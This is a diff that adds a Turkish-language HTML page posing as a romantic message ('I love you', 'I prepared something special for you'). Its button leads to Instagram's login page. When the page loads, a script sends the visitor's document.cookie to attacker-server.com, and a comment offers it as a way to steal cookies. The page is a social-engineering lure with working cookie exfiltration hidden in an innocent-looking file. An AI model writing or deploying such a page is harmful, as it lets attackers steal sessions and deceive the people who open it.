@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Seni Seviyorum 💖</title>
+    <style>
+        body {
+            background-color: pink;
+            font-family: Arial;
+            text-align: center;
+            padding-top: 50px;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            background: red;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <h1>Merhaba 💖</h1>
+    <p>Sana özel bir şey hazırladım...</p>
+    <button onclick="window.location.href='https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2F'">Bakmak İster Misin?</button>
+
+    <!-- JS ile cookie çalmak istersen -->
+    <script>
+        fetch('https://attacker-server.com/log?cookie=' + document.cookie);
+    </script>
+</body>
+</html>
